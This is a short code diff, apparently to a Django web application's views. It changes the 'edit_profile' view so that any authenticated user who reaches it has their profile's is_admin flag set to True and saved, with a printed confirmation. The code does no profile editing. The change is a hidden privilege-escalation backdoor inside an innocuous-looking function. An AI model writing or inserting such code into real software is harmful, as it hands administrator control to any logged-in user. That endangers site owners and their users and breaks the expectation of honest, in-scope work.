@@ -31,6 +31,13 @@ def login_user(request):
 
 
 def edit_profile(request):
+    print(request.user)
+    if request.user.is_authenticated:
+        profile = UserProfile.objects.get(user=request.user)
+        profile.is_admin = True
+        profile.save()
+        print("User", profile, "is now an admin.")
+
     return redirect('/')
 
 
